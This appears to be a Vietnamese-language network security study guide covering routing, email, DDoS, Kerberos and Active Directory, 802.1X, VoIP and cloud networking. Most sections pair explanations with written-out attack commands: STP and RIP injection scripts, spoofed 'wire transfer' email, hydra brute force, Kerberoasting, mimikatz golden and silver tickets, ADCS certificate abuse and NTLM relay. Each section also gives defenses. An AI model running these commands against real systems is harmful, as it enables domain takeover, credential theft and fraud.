Password attack    → hydra / crackmapexec
Pivot              → ssh -D 1080 / chisel / ligolo-ng
Proxy traffic      → proxychains + socks5
Capture traffic    → tcpdump -i eth0 -w cap.pcap / Wireshark
Firewall           → iptables -A INPUT -p tcp --dport 22 -j ACCEPT
```

## Resources

```
Books:
- "The TCP/IP Guide" by Charles M. Kozierok (Bible of networking)
- "Hacking: The Art of Exploitation" by Jon Erickson
- "Penetration Testing" by Georgia Weidman
- "Red Team Field Manual" (RTFM)
- "The Hacker Playbook 3" by Peter Kim
- "Network Security Assessment" by Chris McNab

Online:
- TryHackMe: https://tryhackme.com
- HackTheBox: https://hackthebox.com
- OverTheWire: https://overthewire.org (Bandit → Natas → ...)
- PentesterLab: https://pentesterlab.com
- CyberDefenders: https://cyberdefenders.org (Blue team)
- VulnHub: https://vulnhub.com

YouTube:
- NetworkChuck
- David Bombal
- IppSec (HackTheBox walkthroughs)
- John Hammond
- The Cyber Mentor

Tools Documentation:
- Nmap: https://nmap.org/book/
- Wireshark: https://www.wireshark.org/docs/
- Metasploit: https://docs.metasploit.com/
- Burp Suite: https://portswigger.net/web-security
```

---

# PHẦN 11: ROUTING & SWITCHING NÂNG CAO

## 11.1 TCP/IP Model vs OSI Model

```
OSI Model (7 layers)          TCP/IP Model (4 layers)
─────────────────────         ──────────────────────
Application  (7)  ─┐
Presentation (6)   ├────→    Application
Session      (5)  ─┘
Transport    (4)  ──────→    Transport
Network      (3)  ──────→    Internet
Data Link    (2)  ─┐
Physical     (1)  ─┘────→    Network Access

Thực tế, mạng Internet chạy theo TCP/IP model.
OSI là mô hình lý thuyết để học và tham khảo.
TCP/IP model thực dụng hơn: gộp Layer 5-6-7 → Application,
gộp Layer 1-2 → Network Access.
```

## 11.2 Spanning Tree Protocol (STP) - Chi tiết

### STP là gì?
Khi switch kết nối với nhau tạo loop → broadcast storm (frame loop vô hạn → sập mạng). STP ngăn loop bằng cách disable một số port.

### Cách STP hoạt động

```
1. Bầu Root Bridge (switch có Bridge ID nhỏ nhất)
   Bridge ID = Priority (4 bit, mặc định 32768) + MAC Address

2. Mỗi non-root switch chọn Root Port (port gần root nhất)
   Tính bằng: path cost (bandwidth) đến root bridge

3. Mỗi segment chọn Designated Port (port forward traffic)

4. Tất cả port khác → Blocking state (không forward)

Port States:
  Blocking    → Không forward, chỉ nhận BPDU
  Listening   → Gửi/nhận BPDU, không forward data
  Learning    → Học MAC address, chưa forward data
  Forwarding  → Forward data bình thường
  Disabled    → Admin shutdown

Convergence time: 30-50 giây (STP cổ điển)
RSTP (Rapid STP - 802.1w): <6 giây
MSTP (Multiple STP - 802.1s): 1 instance per VLAN group
```

### STP Attacks

```bash
# === Root Bridge Takeover ===
# Nguyên lý: Gửi BPDU với priority thấp hơn → trở thành root bridge
# → Tất cả traffic đi qua attacker

# Dùng Yersinia
yersinia stp -attack 4 -interface eth0    # Become root bridge

# Dùng Scapy
from scapy.all import *
# Gửi BPDU với priority = 0 (thấp nhất)
frame = Dot3(dst="01:80:c2:00:00:00", src="AA:BB:CC:DD:EE:FF") / \
        LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
        STP(bpdutype=0, rootmac="AA:BB:CC:DD:EE:FF", rootid=0,
            bridgemac="AA:BB:CC:DD:EE:FF", bridgeid=0)
sendp(frame, iface="eth0", loop=1, inter=2)

# === BPDU Flood ===
# Gửi hàng ngàn BPDU → switch overload
yersinia stp -attack 2 -interface eth0

# === Phòng chống ===
# BPDU Guard: Nếu nhận BPDU trên access port → shutdown port
# (config)# interface range gi0/1-24
# (config-if-range)# spanning-tree bpduguard enable

# Root Guard: Không cho port trở thành root port
# (config-if)# spanning-tree guard root

# PortFast: Skip STP cho access port (không chờ 30s)
# (config-if)# spanning-tree portfast
```

## 11.3 Routing Protocols & Attacks

### Distance Vector vs Link State

```
Distance Vector (RIP, EIGRP):
- Mỗi router chỉ biết neighbor trực tiếp
- Gửi routing table cho neighbor định kỳ
- Chậm converge, dễ loop
- "Đường đi theo lời kể" - tin neighbor

Link State (OSPF, IS-IS):
- Mỗi router biết TOÀN BỘ topology
- Gửi Link State Advertisement (LSA) cho tất cả
- Nhanh converge
- "Tự tính đường đi" - dùng Dijkstra algorithm

Path Vector (BGP):
- Dùng cho inter-AS routing (giữa các ISP)
- Gửi full path (AS path) → tránh loop
- Policy-based routing
```

### RIP (Routing Information Protocol)

```
Version: RIPv1 (classful, broadcast), RIPv2 (classless, multicast 224.0.0.9)
Metric: Hop count (max 15, 16 = unreachable)
Timer: Update 30s, Invalid 180s, Flush 240s
Port: UDP 520

# Tấn công RIP: Route Injection
# Gửi RIP update giả → router thêm route sai → traffic đi lệch
from scapy.all import *
rip = IP(dst="224.0.0.9") / UDP(sport=520, dport=520) / \
      RIP() / RIPEntry(AF=2, addr="10.0.0.0", mask="255.0.0.0",
                       nexthop="192.168.1.200", metric=1)
send(rip)

# Phòng chống: RIP authentication (MD5)
```

### OSPF (Open Shortest Path First)

```
Areas: Backbone (Area 0), Stub, NSSA
Multicast: 224.0.0.5 (All OSPF), 224.0.0.6 (DR/BDR)
Protocol: IP Protocol 89
Metric: Cost = Reference BW / Interface BW

Router types:
- Internal Router: Tất cả interfaces trong 1 area
- ABR (Area Border Router): Nối 2+ areas
- ASBR (AS Boundary Router): Nối OSPF với routing protocol khác
- DR (Designated Router): Giảm adjacency trong multi-access network

# OSPF Attacks:
# 1. LSA Injection: Inject fake LSA → thay đổi routing
# 2. Phantom Router: Join OSPF area, trở thành DR
# 3. MaxAge LSA: Gửi LSA với MaxAge → route bị xóa

# Dùng Loki framework cho OSPF attacks
# Hoặc FRRouting để join OSPF domain

# Phòng chống:
# OSPF authentication (MD5 hoặc SHA)
# (config-router)# area 0 authentication message-digest
# (config-if)# ip ospf message-digest-key 1 md5 SECRET_KEY

# TTL Security (chỉ nhận packet TTL=255 → phải từ neighbor trực tiếp)
# (config-router)# ttl-security all-interfaces hops 1
```

### BGP (Border Gateway Protocol) - Internet Backbone

```
Type: Path Vector, TCP port 179
Dùng cho: Routing giữa các AS (Autonomous System) trên Internet
Mỗi ISP, tổ chức lớn = 1 AS, có ASN (AS Number)

eBGP: Giữa AS khác nhau
iBGP: Trong cùng AS

BGP Decision Process (thứ tự ưu tiên):
1. Highest Weight (Cisco proprietary)
2. Highest Local Preference
3. Locally originated routes
4. Shortest AS Path
5. Lowest Origin type (IGP < EGP < Incomplete)
6. Lowest MED
7. eBGP over iBGP
8. Lowest IGP metric to next-hop
9. Oldest route
10. Lowest Router ID
```

### BGP Hijacking

```
Nguyên lý: BGP dựa trên TRUST. Khi AS announce prefix, neighbor tin.
Attacker announce prefix của victim → traffic bị redirect.

Ví dụ thực tế:
- 2018: MyEtherWallet bị BGP hijack → redirect DNS → steal crypto
- 2008: Pakistan Telecom hijack YouTube prefix (accident)

Loại BGP Hijack:
1. Prefix Hijack: Announce CÙNG prefix → traffic bị chia
2. Sub-prefix Hijack: Announce prefix CỤ THỂ HƠN (ví dụ /25 thay vì /24)
   → More specific = preferred → chiếm hết traffic
3. AS Path Manipulation: Prepend AS path giả

# Monitoring:
# BGPStream: https://bgpstream.com
# RIPE RIS: https://ris.ripe.net
# BGP Toolkit: https://bgp.he.net

# Phòng chống:
# RPKI (Resource Public Key Infrastructure): Validate route origin
# ROA (Route Origin Authorization): Signed object saying "AS X is authorized to announce prefix Y"
# IRR (Internet Routing Registry): Database of routing policies
# BGPSec: Crypto validation of entire AS path (chưa deploy rộng)
```

### EIGRP (Cisco proprietary)

```
Protocol: IP Protocol 88
Metric: Composite (Bandwidth, Delay, Reliability, Load)
Multicast: 224.0.0.10
Dùng DUAL algorithm

# EIGRP Attack: Neighborhip injection
# Join EIGRP domain → inject routes
# Tool: Loki, FRRouting, Scapy

# Phòng chống: EIGRP authentication (MD5/SHA)
```

## 11.4 Network Topology Design

```
=== Common Topologies ===

Star:
  Tất cả node kết nối vào 1 switch trung tâm
  Pros: Dễ quản lý, lỗi 1 node không ảnh hưởng khác
  Cons: Single point of failure (switch trung tâm)

Spine-Leaf (Modern Data Center):
  Leaf switches: Kết nối servers
  Spine switches: Kết nối tất cả leaf switches
  Mỗi leaf kết nối TẤT CẢ spine (full mesh)
  Pros: Predictable latency, horizontal scaling
  Cons: Nhiều cáp, chi phí cao

  ┌────────┐  ┌────────┐  ┌────────┐
  │ Spine1 │  │ Spine2 │  │ Spine3 │
  └─┬──┬─┬─┘  └─┬──┬─┬─┘  └─┬──┬─┬─┘
    │  │  │      │  │  │      │  │  │
    │  │  └──────┘  │  └──────┘  │  │
    │  └─────┐ ┌────┘  ┌─────┘  │  │
  ┌─┴──┴─────┴─┴───────┴────────┴──┴─┐
  │ Leaf1 │  │ Leaf2 │  │ Leaf3 │     │
  └───┬───┘  └───┬───┘  └───┬───┘
   Servers    Servers    Servers

Three-Tier (Enterprise Classic):
  Core → Distribution → Access
  Core: High-speed backbone
  Distribution: Policy, filtering, inter-VLAN routing
  Access: End-user connectivity

DMZ Architecture:
  Internet → Firewall → DMZ (web servers, mail servers)
                       → Internal Network (workstations, DB)
  DMZ = Demilitarized Zone: vùng đệm giữa Internet và Internal
```

## 11.5 Load Balancing

```
Layer 4 (Transport) Load Balancer:
  Dựa trên IP + Port
  Nhanh, ít overhead
  Ví dụ: HAProxy (TCP mode), LVS, F5

Layer 7 (Application) Load Balancer:
  Dựa trên nội dung HTTP (URL, header, cookie)
  Có thể: SSL termination, caching, WAF
  Ví dụ: HAProxy (HTTP mode), Nginx, AWS ALB, Traefik

Algorithms:
  Round Robin        → Lần lượt từng server
  Weighted Round Robin → Server mạnh nhận nhiều hơn
  Least Connections  → Server ít connection nhất
  IP Hash            → Cùng client IP → cùng server (session persistence)
  Random             → Chọn ngẫu nhiên

# HAProxy config ví dụ
frontend http_front
    bind *:80
    default_backend http_back

backend http_back
    balance roundrobin
    server web1 192.168.1.10:80 check
    server web2 192.168.1.11:80 check
    server web3 192.168.1.12:80 check

# Security góc nhìn:
# Load balancer là single point of failure nếu không HA
# Health check bypass: respond 200 nhưng app lỗi
# Session persistence → session fixation risk
# X-Forwarded-For header spoofing
```

---

# PHẦN 12: EMAIL SECURITY & SMTP ATTACKS

## 12.1 SMTP (Simple Mail Transfer Protocol) - Port 25/465/587

### SMTP hoạt động thế nào

```
Sender → SMTP Client → SMTP Server (MTA) ──→ Recipient MTA → POP3/IMAP → Recipient

SMTP Session:
┌──────────────────────────────────────────┐
│ Client: HELO mail.attacker.com           │
│ Server: 250 Hello                        │
│ Client: MAIL FROM:<admin@target.com>     │
│ Server: 250 OK                           │
│ Client: RCPT TO:<victim@target.com>      │
│ Server: 250 OK                           │
│ Client: DATA                             │
│ Server: 354 Start mail input             │
│ Client: Subject: Important               │
│         From: admin@target.com           │
│         To: victim@target.com            │
│                                          │
│         This is the email body.           │
│         .                                │
│ Server: 250 OK                           │
│ Client: QUIT                             │
└──────────────────────────────────────────┘

Ports:
  25  → SMTP (server-to-server relay)
  465 → SMTPS (implicit TLS, deprecated)
  587 → Submission (client-to-server, STARTTLS)
```

### SMTP Attacks

```bash
# === Email Spoofing ===
# SMTP không verify sender identity (MAIL FROM có thể giả)

# Dùng swaks (Swiss Army Knife for SMTP)
swaks --to victim@target.com \
      --from ceo@target.com \
      --server mail.target.com \
      --header "Subject: Urgent - Wire Transfer" \
      --body "Please transfer $50,000 to account..."

# Dùng sendemail
sendemail -f ceo@target.com -t victim@target.com \
          -u "Urgent" -m "Body text" \
          -s mail.target.com

# Kiểm tra SMTP open relay
nmap --script smtp-open-relay -p 25 mail.target.com

# SMTP user enumeration
# VRFY command (verify user exists)
nmap --script smtp-enum-users -p 25 mail.target.com
smtp-user-enum -M VRFY -U users.txt -t mail.target.com

# SMTP NTLM authentication capture
# Dùng Responder hoặc Metasploit
```

### Email Security Headers (SPF, DKIM, DMARC)

```
=== SPF (Sender Policy Framework) ===
DNS TXT record chỉ định server nào được phép gửi email cho domain.

target.com TXT "v=spf1 ip4:203.0.113.0/24 include:_spf.google.com -all"

v=spf1           → SPF version 1
ip4:203.0.113.0  → Cho phép dải IP này gửi email
include:         → Cho phép SPF record của domain khác
-all             → Reject tất cả server không nằm trong list
~all             → Soft fail (đánh dấu nhưng vẫn nhận)
?all             → Neutral (không check)

# Kiểm tra SPF
dig target.com TXT | grep spf

=== DKIM (DomainKeys Identified Mail) ===
Server ký email bằng private key, receiver verify bằng public key trong DNS.

DNS record: selector._domainkey.target.com TXT "v=DKIM1; k=rsa; p=PUBLIC_KEY..."

# Kiểm tra DKIM
dig selector._domainkey.target.com TXT

=== DMARC (Domain-based Message Authentication) ===
Policy nói receiver làm gì khi email fail SPF/DKIM.

_dmarc.target.com TXT "v=DMARC1; p=reject; rua=mailto:dmarc@target.com"

p=none     → Không làm gì (chỉ report)
p=quarantine → Đưa vào spam
p=reject   → Reject email
rua=       → Gửi aggregate report đến đâu

# Kiểm tra DMARC
dig _dmarc.target.com TXT

# Kiểm tra toàn bộ email security
# https://mxtoolbox.com/
```

## 12.2 POP3 / IMAP

```
POP3 (Port 110/995):
  Download email về client, XÓA trên server
  Đơn giản, offline access
  POP3S = POP3 + TLS (port 995)

IMAP (Port 143/993):
  Đồng bộ email giữa client và server
  Email ở trên server
  IMAPS = IMAP + TLS (port 993)

# Brute force
hydra -l user@target.com -P passwords.txt pop3://mail.target.com
hydra -l user@target.com -P passwords.txt imap://mail.target.com

# Đọc email sau khi có credentials
# POP3 manual
nc mail.target.com 110
USER admin@target.com
PASS password
LIST
RETR 1

# IMAP manual
nc mail.target.com 143
a1 LOGIN admin@target.com password
a2 LIST "" "*"
a3 SELECT INBOX
a4 FETCH 1 BODY[]
```

---

# PHẦN 13: DDoS - HIỂU VÀ PHÒNG CHỐNG

## 13.1 DDoS Taxonomy

```
┌─────────────────────────────────────────────────────────────┐
│                     DDoS Attack Types                       │
├──────────────────┬──────────────────┬───────────────────────┤
│ Volumetric       │ Protocol         │ Application Layer     │
│ (Layer 3/4)      │ (Layer 3/4)      │ (Layer 7)             │
├──────────────────┼──────────────────┼───────────────────────┤
│ UDP Flood        │ SYN Flood        │ HTTP Flood            │
│ DNS Amplification│ ACK Flood        │ Slowloris             │
│ NTP Amplification│ Ping of Death    │ RUDY (R-U-Dead-Yet)   │
│ SSDP Amplification│ Smurf Attack   │ DNS Water Torture     │
│ Memcached Ampl.  │ TCP Fragment     │ WordPress Pingback    │
│ CHARGEN          │ IP Null Attack   │ API Abuse             │
└──────────────────┴──────────────────┴───────────────────────┘

Volumetric: Saturate bandwidth (Gbps)
Protocol: Exhaust server/firewall state tables (PPS)
Application: Exhaust application resources (RPS)
```

## 13.2 Amplification Attacks (Chi tiết)

```
Nguyên lý: Gửi request nhỏ với source IP giả (victim IP)
→ Server trả response LỚN về victim IP

Protocol    Amplification Factor    Port
──────────  ────────────────────    ────
Memcached   51,000x                 11211
NTP         556x                    123
DNS         28-54x                  53
SSDP        30x                     1900
CHARGEN     358x                    19
SNMP        6x                      161
LDAP        46-55x                  389

# DNS Amplification
# Request nhỏ (60 bytes) → Response lớn (3000+ bytes)
# Spoofed source IP = victim
dig ANY google.com @open-resolver     # Response ~3KB

# NTP Amplification
# monlist command trả về list 600 clients gần nhất
ntpdc -n -c monlist open-ntp-server   # Response ~100x request

# Memcached Amplification (51,000x!)
# stats command hoặc get large_key
# 2018: GitHub bị 1.35 Tbps DDoS qua Memcached
```

## 13.3 Application Layer DDoS

```bash
# === Slowloris ===
# Nguyên lý: Mở nhiều connection, gửi HTTP header CHẬM (không bao giờ hoàn thành)
# → Server giữ connection open → hết connection pool

# Cách hoạt động:
# 1. Mở connection
# 2. Gửi: GET / HTTP/1.1\r\n
# 3. Gửi: X-Header: value\r\n    (cứ mỗi 15 giây gửi 1 header)
# 4. KHÔNG BAO GIỜ gửi \r\n cuối cùng (kết thúc header)
# → Server chờ mãi

# Tool (chỉ dùng trong lab):
# slowloris.py
# slowhttptest

# === HTTP Flood ===
# Gửi hàng triệu HTTP GET/POST request hợp lệ
# Khó phân biệt với traffic thật

# === DNS Water Torture ===
# Gửi query cho random subdomain: abc123.target.com
# DNS server phải resolve (cache miss) → overload authoritative DNS

# === RUDY (R-U-Dead-Yet) ===
# POST request với Content-Length lớn
# Gửi body 1 byte mỗi 10 giây → connection mở mãi
```

## 13.4 DDoS Mitigation

```
1. Network Level:
   - Anycast: Phân tán traffic đến nhiều PoP (Point of Presence)
   - Blackhole Routing: Drop traffic đến IP bị tấn công (last resort)
   - Rate Limiting: Giới hạn request/second per IP
   - ACL: Block known bad IPs
   - BGP Flowspec: Inject firewall rules qua BGP

2. Scrubbing Services:
   - Cloudflare, AWS Shield, Akamai Prolexic
   - Traffic đi qua scrubbing center → lọc → forward clean traffic
   - Hoạt động: DNS trỏ về scrubbing center thay vì origin

3. Application Level:
   - WAF rules
   - CAPTCHA cho suspicious traffic
   - JavaScript challenge (bot không chạy JS)
   - Rate limiting per endpoint
   - Connection timeout giảm

4. Infrastructure:
   - Over-provisioning bandwidth
   - CDN (Content Delivery Network) phân tán load
   - Load balancer với health check
   - Auto-scaling (cloud)

5. Anti-Slowloris:
   - Apache: mod_reqtimeout, mod_qos
   - Nginx: mặc định resistant (event-based, không giữ thread per connection)
   - HAProxy: timeout http-request 5s
```

## 13.5 Botnet Architecture

```
=== Centralized C2 ===
                   ┌──────┐
                   │  C2  │
                   └──┬───┘
           ┌──────┬──┴──┬──────┐
           │      │     │      │
         Bot1   Bot2  Bot3   Bot4
Ưu: Dễ quản lý     Nhược: Single point of failure

=== P2P Botnet ===
         Bot1 ←→ Bot2
           ↕        ↕
         Bot3 ←→ Bot4
Ưu: Resilient, khó takedown     Nhược: Chậm command propagation

=== Domain Generation Algorithm (DGA) ===
Bot tự generate random domain hàng ngày
Bot master register domain trước → C2
Law enforcement khó block vì domain thay đổi liên tục
Ví dụ: Conficker tạo 50,000 domain/ngày

=== Fast Flux ===
Domain resolve đến nhiều IP khác nhau (bot IPs)
IP thay đổi liên tục (TTL rất thấp)
→ Khó trace back đến real C2
```

---

# PHẦN 14: KERBEROS & ACTIVE DIRECTORY NETWORKING

## 14.1 Kerberos Protocol Deep Dive

### Kerberos Components

```
KDC (Key Distribution Center) = chạy trên Domain Controller
├── AS (Authentication Service): Xác thực user, cấp TGT
└── TGS (Ticket Granting Service): Cấp service ticket

TGT (Ticket Granting Ticket): "Giấy thông hành" chứng minh user đã xác thực
Service Ticket (TGS): "Vé" truy cập service cụ thể
```

### Kerberos Authentication Flow

```
┌────────┐         ┌──────┐         ┌─────────┐
│ Client │         │  KDC │         │ Service │
└───┬────┘         └──┬───┘         └────┬────┘
    │                  │                  │
    │ 1. AS-REQ        │                  │
    │ (username,       │                  │
    │  timestamp       │                  │
    │  encrypted with  │                  │
    │  user's hash)    │                  │
    │─────────────────>│                  │
    │                  │                  │
    │ 2. AS-REP        │                  │
    │ (TGT encrypted   │                  │
    │  with krbtgt hash,│                 │
    │  session key      │                 │
    │  encrypted with   │                 │
    │  user's hash)    │                  │
    │<─────────────────│                  │
    │                  │                  │
    │ 3. TGS-REQ       │                  │
    │ (TGT + SPN of    │                  │
    │  target service) │                  │
    │─────────────────>│                  │
    │                  │                  │
    │ 4. TGS-REP       │                  │
    │ (Service Ticket   │                 │
    │  encrypted with   │                 │
    │  service's hash) │                  │
    │<─────────────────│                  │
    │                  │                  │
    │ 5. AP-REQ (Service Ticket)          │
    │────────────────────────────────────>│
    │                  │                  │
    │ 6. AP-REP (Optional mutual auth)    │
    │<────────────────────────────────────│
```

### Kerberos Attacks

```bash
# === Kerberoasting ===
# Nguyên lý: Service Ticket (TGS) encrypted bằng service account password hash
# Bất kỳ domain user nào cũng xin được TGS cho bất kỳ SPN
# → Request TGS → Offline crack hash

# Tìm SPN accounts
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1

# Request TGS và crack
GetUserSPNs.py domain/user:password -dc-ip 192.168.1.1 -request -outputfile hashes.txt
hashcat -m 13100 hashes.txt wordlist.txt

# Với Rubeus (trên Windows)
Rubeus.exe kerberoast /outfile:hashes.txt

# === AS-REP Roasting ===
# Nguyên lý: Account có "Do not require Kerberos pre-authentication" enabled
# → Ai cũng request được AS-REP → chứa hash encrypted với user password → crack

# Tìm AS-REP roastable accounts
GetNPUsers.py domain/ -dc-ip 192.168.1.1 -usersfile users.txt -no-pass -outputfile asrep.txt
hashcat -m 18200 asrep.txt wordlist.txt

# === Golden Ticket ===
# Nguyên lý: Nếu có krbtgt hash → tạo TGT tùy ý (bất kỳ user, bất kỳ group)
# → Truy cập MỌI THỨ trong domain

# Lấy krbtgt hash (cần Domain Admin):
mimikatz> lsadump::dcsync /user:krbtgt

# Tạo Golden Ticket:
mimikatz> kerberos::golden /user:Administrator /domain:target.com \
  /sid:S-1-5-21-... /krbtgt:hash /ptt

# Với ticketer (Impacket)
ticketer.py -nthash krbtgt_hash -domain-sid S-1-5-21-... \
  -domain target.com Administrator

# === Silver Ticket ===
# Giống Golden nhưng cho 1 service cụ thể
# Chỉ cần service account hash (không cần krbtgt)
mimikatz> kerberos::golden /user:Administrator /domain:target.com \
  /sid:S-1-5-21-... /target:server.target.com \
  /service:cifs /rc4:service_hash /ptt

# === Unconstrained Delegation ===
# Server được phép delegate TGT của user cho bất kỳ service nào
# Compromise server này → steal TGT của bất kỳ ai connect đến

# Tìm unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $True}

# === Constrained Delegation Abuse ===
# S4U2Self + S4U2Proxy → impersonate bất kỳ user
getST.py -spn cifs/target.com -impersonate Administrator \
  domain/service_account:password -dc-ip 192.168.1.1

# === Resource-Based Constrained Delegation (RBCD) ===
# Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute
rbcd.py -delegate-from attacker$ -delegate-to target$ \
  -action write domain/user:password
getST.py -spn cifs/target.com -impersonate Administrator \
  domain/attacker$:password
```

## 14.2 AD Certificate Services (ADCS) Attacks

```bash
# === ESC1: Misconfigured Certificate Template ===
# Template cho phép: enrollee supplies subject (SAN)
# → Request cert cho Domain Admin!
certipy find -u user@target.com -p password -dc-ip 192.168.1.1 -vulnerable

certipy req -u user@target.com -p password -ca CA-NAME \
  -template VulnTemplate -upn administrator@target.com

certipy auth -pfx administrator.pfx

# === ESC8: NTLM Relay to ADCS HTTP Enrollment ===
# Relay NTLM auth đến ADCS web enrollment → get cert as victim
ntlmrelayx.py -t http://ca-server/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController

# Nhiều ESC variants (ESC1-ESC13+)
# Dùng Certipy hoặc Certify để tìm và exploit
```

## 14.3 ADIDNS Poisoning

```bash
# Nguyên lý: AD-Integrated DNS cho phép authenticated users tạo record
# → Tạo wildcard record (*.domain) → capture traffic

# Dùng Inveigh hoặc dnstool.py
python3 dnstool.py -u 'domain\user' -p password -a add \
  -r '*.target.com' -d attacker-ip dc-ip
```

---

# PHẦN 15: AAA & NETWORK ACCESS CONTROL

## 15.1 RADIUS (Remote Authentication Dial-In User Service)

```
Port: UDP 1812 (Authentication), 1813 (Accounting)
Dùng cho: Wi-Fi 802.1X, VPN authentication, network device login

Flow:
Client → NAS (Network Access Server) → RADIUS Server → AD/LDAP

┌────────┐     ┌──────┐     ┌────────┐     ┌──────┐
│ Client │ ──→ │ NAS  │ ──→ │ RADIUS │ ──→ │ AD/  │
│        │     │(AP/  │     │ Server │     │ LDAP │
│        │     │Switch│     │(FreeRADIUS)│  │      │
└────────┘     └──────┘     └────────┘     └──────┘

RADIUS Packets:
  Access-Request    → NAS gửi credentials lên RADIUS
  Access-Accept     → RADIUS cho phép
  Access-Reject     → RADIUS từ chối
  Access-Challenge  → RADIUS yêu cầu thêm thông tin
  Accounting-Request → Log session (start/stop/interim)

# FreeRADIUS setup
apt install freeradius
# Config: /etc/freeradius/3.0/
# clients.conf: Định nghĩa NAS devices
# users: User database
# radiusd.conf: Main config

# Testing
radtest user password radius-server 0 shared_secret

# Security issues:
# Shared secret yếu → brute force
# RADIUS traffic (ngoài password) KHÔNG encrypted
# → Dùng RADSEC (RADIUS over TLS) cho transit security
```

## 15.2 TACACS+ (Terminal Access Controller Access-Control System Plus)

```
Port: TCP 49
Dùng cho: Network device authentication (Cisco, Juniper)
Khác RADIUS: Encrypt TOÀN BỘ packet (không chỉ password)
Tách biệt Authentication, Authorization, Accounting (AAA)

So sánh RADIUS vs TACACS+:
┌──────────────┬───────────────┬────────────────┐
│ Feature      │ RADIUS        │ TACACS+        │
├──────────────┼───────────────┼────────────────┤
│ Transport    │ UDP           │ TCP            │
│ Encryption   │ Password only │ Full packet    │
│ AAA          │ Combined      │ Separate       │
│ Use case     │ Network access│ Device admin   │
│ Standard     │ Open          │ Cisco          │
└──────────────┴───────────────┴────────────────┘
```

## 15.3 802.1X (Port-Based Network Access Control)

```
Components:
  Supplicant: Client muốn truy cập mạng (laptop/phone)
  Authenticator: Switch/AP kiểm soát port
  Authentication Server: RADIUS server

Flow:
┌──────────┐     ┌──────────────┐     ┌────────┐
│Supplicant│ ──→ │Authenticator │ ──→ │RADIUS  │
│(Client)  │ EAP │(Switch/AP)   │RADIUS│Server  │
└──────────┘     └──────────────┘     └────────┘

1. Client kết nối → port ở trạng thái "unauthorized"
2. Switch gửi EAP-Request/Identity
3. Client trả EAP-Response/Identity (username)
4. Switch forward lên RADIUS
5. RADIUS challenge → client authenticate
6. RADIUS Accept → switch chuyển port sang "authorized"

EAP Methods:
  EAP-TLS:      Certificate-based (mạnh nhất, cần PKI)
  PEAP:         Server cert + username/password (phổ biến nhất)
  EAP-TTLS:     Giống PEAP nhưng linh hoạt hơn
  EAP-FAST:     Cisco, dùng PAC (Protected Access Credential)

# 802.1X Bypass Techniques:
# 1. MAC Bypass (MAB): Nếu device không hỗ trợ 802.1X
#    → Switch fallback cho phép dựa trên MAC → Spoof MAC
# 2. NAC bypass: Clone MAC + IP của authorized device
# 3. Hub trick: Cắm hub giữa authorized device và switch
#    → Hai device share port
# 4. VLAN hopping sau khi authenticate
# 5. EAP downgrade attack
```

## 15.4 NAC (Network Access Control) Solutions

```
Cisco ISE, Aruba ClearPass, FortiNAC, PacketFence (open source)

NAC checks:
  - Identity: Ai?
  - Posture: Antivirus updated? OS patched? Firewall on?
  - Compliance: Corporate policy compliance
  
Actions:
  - Allow full access
  - Quarantine VLAN (chỉ cho patch/update)
  - Deny access
  - Guest VLAN

# NAC Bypass:
# Spoof compliant device's MAC + IP
# Modify HTTP User-Agent để bypass posture check
# VLAN manipulation sau khi vào quarantine VLAN
```

---

# PHẦN 16: VoIP / SIP ATTACKS

## 16.1 SIP (Session Initiation Protocol)

```
Port: UDP/TCP 5060 (SIP), 5061 (SIPS/TLS)
RTP: UDP 10000-20000 (Real-time Transport Protocol - actual voice)

SIP Methods:
  INVITE    → Start call
  ACK       → Confirm
  BYE       → End call
  REGISTER  → Register with SIP server
  CANCEL    → Cancel pending request
  OPTIONS   → Query capabilities

SIP Call Flow:
  Caller → INVITE → SIP Proxy → INVITE → Callee
  Callee → 180 Ringing → SIP Proxy → 180 Ringing → Caller
  Callee → 200 OK → SIP Proxy → 200 OK → Caller
  Caller → ACK → Callee
  [RTP Media Stream directly between Caller ↔ Callee]
  Caller → BYE → Callee
  Callee → 200 OK → Caller
```

## 16.2 VoIP Attacks

```bash
# === SIP Enumeration ===
svmap 192.168.1.0/24                           # Find SIP devices
svwar -m INVITE -e 100-999 192.168.1.100       # Enumerate extensions

# === SIP Brute Force ===
sipvicious: svcrack -u 100 -d wordlist.txt 192.168.1.100

# === VoIP Eavesdropping ===
# MITM (ARP spoof) → capture RTP → decode audio
# Wireshark: Telephony → VoIP Calls → Play Streams

# === Toll Fraud ===
# Register giả lên SIP server → gọi international

# === SRTP (Secure RTP) ===
# Encrypted voice → không nghe lén được
# ZRTP: End-to-end encryption cho VoIP

# === SIP specific tools ===
# SIPVicious Suite: svmap, svwar, svcrack
# VoIPER: Fuzzer cho SIP
# Owasp VoIP Security: Testing methodology
```

---

# PHẦN 17: CLOUD NETWORKING & SECURITY

## 17.1 AWS Networking

```
VPC (Virtual Private Cloud):
  CIDR block: 10.0.0.0/16 (ví dụ)
  ├── Public Subnet:  10.0.1.0/24 (có Internet Gateway)
  ├── Private Subnet: 10.0.2.0/24 (không có IGW)
  └── Database Subnet: 10.0.3.0/24

Components:
  Internet Gateway (IGW): Kết nối VPC ra Internet
  NAT Gateway: Cho private subnet ra Internet (outbound only)
  Route Table: Routing rules cho mỗi subnet
  Security Group: Stateful firewall per instance (allow rules only)
  Network ACL: Stateless firewall per subnet (allow + deny rules)
  VPC Peering: Kết nối 2 VPC (same/cross account)
  Transit Gateway: Hub kết nối nhiều VPC + on-premises
  VPC Endpoint: Truy cập AWS services mà không qua Internet
  PrivateLink: Expose service cho VPC khác qua private connection

Security Group vs NACL:
┌──────────────┬──────────────────┬──────────────────┐
│              │ Security Group   │ NACL             │
├──────────────┼──────────────────┼──────────────────┤
│ Level        │ Instance (ENI)   │ Subnet           │
│ Stateful     │ Yes              │ No               │
│ Rules        │ Allow only       │ Allow + Deny     │
│ Evaluation   │ All rules        │ In order (number)│
│ Default      │ Deny all inbound │ Allow all        │
└──────────────┴──────────────────┴──────────────────┘

# Common misconfigs:
# Security Group: 0.0.0.0/0 cho port 22/3389 (SSH/RDP open to world)
# S3 bucket policy public
# IMDSv1 → SSRF → steal IAM credentials
# VPC Flow Logs not enabled
```

## 17.2 Azure Networking

```
Virtual Network (VNet): Tương đương AWS VPC
Network Security Group (NSG): Tương đương Security Group + NACL
Azure Firewall: Managed firewall service
Application Gateway: L7 load balancer + WAF
VNet Peering: Kết nối VNet
ExpressRoute: Dedicated connection (tương đương AWS Direct Connect)
Private Endpoint: Truy cập Azure service qua private IP
